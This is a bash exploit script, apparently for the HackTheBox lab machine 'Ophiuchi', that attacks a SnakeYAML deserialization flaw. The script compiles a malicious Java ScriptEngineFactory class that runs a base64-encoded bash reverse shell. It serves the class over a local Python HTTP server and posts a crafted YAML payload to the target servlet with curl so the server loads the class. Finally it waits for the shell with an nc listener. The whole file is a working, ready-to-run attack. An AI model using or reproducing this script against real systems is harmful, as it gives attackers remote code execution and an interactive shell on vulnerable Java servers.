#!/bin/bash

# Usage check... Banner... 

if [ ${#@} -lt 3 ]; then
    echo -e "\nUsage:\nbash Ophiuchi_foothold.sh WEB_URL REVERSE_IP REVERSE_PORT"
    echo -e "\nEg:\nbash Ophiuchi_foothold.sh http://10.10.10.227:8080/Servlet 10.10.10.10 8888"
    exit 1;
fi

if [ -d poc  ]; then
	rm -rf poc/

fi

mkdir -p poc/META-INF/services
mkdir -p poc/snake

touch poc/META-INF/services/javax.script.ScriptEngineFactory
echo "snake.exploit" >> poc/META-INF/services/javax.script.ScriptEngineFactory
touch poc/snake/exploit.java

WEB_URL=$1
IP=$2
PORT=$3
PY_PORT="8081"
#Kill any python servers up already on the port above. 
kill $(ps -aux | grep 8081 | grep "python" | awk '{print $2}') 2>/dev/null
#kill $(ps -aux | grep "$3" | grep "python" | awk '{print $2}') 2>/dev/null

SHELL="bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'"
PAYLOAD=$(echo "$SHELL" | base64)


JAVA_EXPLOIT=$(cat << 'EOF'
package snake;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class exploit implements ScriptEngineFactory {

    public exploit() {
        try {
            Runtime.getRuntime().exec("bash -c {echo,BASE64_REPLACE}|{base64,-d}|{bash,-i}");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}
EOF
)

JAVA_PAYLOAD=$(echo  "$JAVA_EXPLOIT" | sed "s/BASE64_REPLACE/$PAYLOAD/")

echo "$JAVA_PAYLOAD" > poc/snake/exploit.java
cd poc

echo "[+] Building payload..."
javac snake/exploit.java 2>/dev/null
sleep 2
python3 -m http.server "$PY_PORT" &
(sleep 3; curl -d  'data=!!javax.script.ScriptEngineManager%20%5b%0d%0a%20%20!!java.net.URLClassLoader%20%5b%5b%0d%0a%20%20%20%20!!java.net.URL%20%5b%22http%3a%2f%2f'"$IP"'%3a'"$PY_PORT"'%2f%22%5d%0a%20%20%5d%5d%0d%0a%5d' "$1") &
    #(sleep 3; curl -d  'data=!!javax.script.ScriptEngineManager%20%5b%0d%0a%20%20!!java.net.URLClassLoader%20%5b%5b%0d%0a%20%20%20%20!!java.net.URL%20%5b%22http%3a%2f%2f'"$IP"'%3a'"$PY_PORT"'%2f%22%5d%0a%20%20%5d%5d%0d%0a%5d'  "http://10.10.10.227:8080/Servlet") &
nc -lnvp "$PORT"
